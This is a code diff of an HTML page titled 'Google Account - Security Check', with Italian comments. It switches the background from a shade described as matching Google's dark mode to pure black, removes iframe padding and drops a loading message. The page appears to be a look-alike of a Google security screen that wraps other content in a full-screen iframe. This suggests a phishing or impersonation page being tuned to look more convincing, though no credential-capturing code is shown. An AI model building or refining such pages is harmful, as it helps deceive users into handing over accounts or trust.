@@ -3,35 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="theme-color" content="#1a1b1e">
+    <meta name="theme-color" content="#000000">
     <title>Google Account - Security Check</title>
     <style>
-        /* Reset totale dei margini */
+        /* Reset totale per eliminare ogni stacco visivo */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* Sfondo identico alla Dark Mode originale di Google */
+        /* SFONDO UNIVOCAMENTE NERO */
         body, html { 
             height: 100%; 
             width: 100%; 
             overflow: hidden; 
-            background-color: #1a1b1e; 
+            background-color: #000000; 
             font-family: 'Roboto', Arial, sans-serif;
         }
 
-        /* Container dell'Iframe: aggiunge lo spazio in alto per l'allineamento */
+        /* Wrapper rimosso il padding per unire i colori */
         .iframe-wrapper {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            /* Questo valore sposta il contenuto verso il basso per non tagliare il logo */
-            padding-top: 45px; 
-            background-color: #1a1b1e;
+            background-color: #000000;
             z-index: 2;
         }
 
@@ -43,7 +41,7 @@
             background-color: transparent;
         }
 
-        /* Animazione di caricamento professionale su sfondo scuro */
+        /* Caricamento su nero totale */
         .loader-container {
             display: flex;
             flex-direction: column;
@@ -54,8 +52,8 @@
             position: absolute;
             top: 0;
             left: 0;
-            z-index: 1; /* Resta dietro l'iframe-wrapper */
-            background-color: #1a1b1e;
+            z-index: 1;
+            background-color: #000000;
         }
 
         .spinner {
@@ -80,7 +78,6 @@
 
     <div class="loader-container">
         <div class="spinner"></div>
-        <p class="loading-text">One moment...</p>
     </div>
 
     <div class="iframe-wrapper">
